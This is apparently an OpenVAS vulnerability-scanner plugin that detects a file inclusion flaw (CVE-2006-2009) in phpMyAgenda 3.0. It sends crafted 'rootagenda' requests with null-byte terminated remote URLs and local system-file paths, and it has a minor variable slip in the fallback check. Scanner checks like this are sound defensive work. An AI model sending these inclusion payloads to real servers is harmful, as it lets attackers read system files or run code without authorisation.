# SPDX-FileCopyrightText: 2008 Ferdy Riphagen
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.200002");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-2009");
  script_name("phpMyAgenda 3.0 File Inclusion Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2008 Ferdy Riphagen");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl",
                      "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/431862/30/0/threaded");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/17670");

  script_tag(name:"summary", value:"phpMyAgenda is prone to a file inclusion vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The application does not sanitize the 'rootagenda' parameter in
  some of it's files. This allows an attacker to include arbitrary files from remote systems and
  parse them with privileges of the account under which the web server is started.

  This vulnerability exists if PHP's 'register_globals' & 'magic_quotes_gpc' are both enabled for
  the local file inclusions flaw.

  And if 'allow_url_fopen' is also enabled remote file inclusions are also possible.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))
  exit(0);

host = http_host_name(dont_add_port:TRUE);

foreach dir(make_list_unique("/phpmyagenda", "/agenda", http_cgi_dirs(port:port))) {

  if(dir == "/")
    dir = "";

  res = http_get_cache(item:dir + "/agenda.php3", port:port);
  if(res && egrep(pattern:"<a href=[^?]+\?modeagenda=calendar", string:res)) {

    files = traversal_files();

    foreach pattern(keys(files)) {

      file[0] = string("http://", host, dir, "/bugreport.txt");
      file[1] = "/" + files[pattern];

      url = dir + "/infoevent.php3?rootagenda=" + file[0] + "%00";
      req = http_get(item:url, port:port);
      res = http_keepalive_send_recv(data:req, bodyonly:TRUE, port:port);
      if (!res)
        continue;

      if ("Bug report for phpMyAgenda" >< res) {
        report = http_report_vuln_url(port:port, url:url);
        security_message(port:port, data:report);
        exit(0);
      }
      else {
        # Maybe PHP's 'allow_url_fopen' is set to Off on the remote host.
        # In this case, try a local file inclusion.
        url = dir + "/infoevent.php3?rootagenda=" + file[1] + "%00";
        req2 = http_get(item:url, port:port);
        res2 = http_keepalive_send_recv(data:req2, bodyonly:TRUE, port:port);
        if (!res)
          continue;

        if (egrep(pattern:pattern, string:res2)) {
          # PHP's 'register_globals' and 'magic_quotes_gpc' are enabled on the remote host.
          report = http_report_vuln_url(port:port, url:url);
          security_message(port:port, data:report);
          exit(0);
        }
      }
    }
  }
}

exit(99);
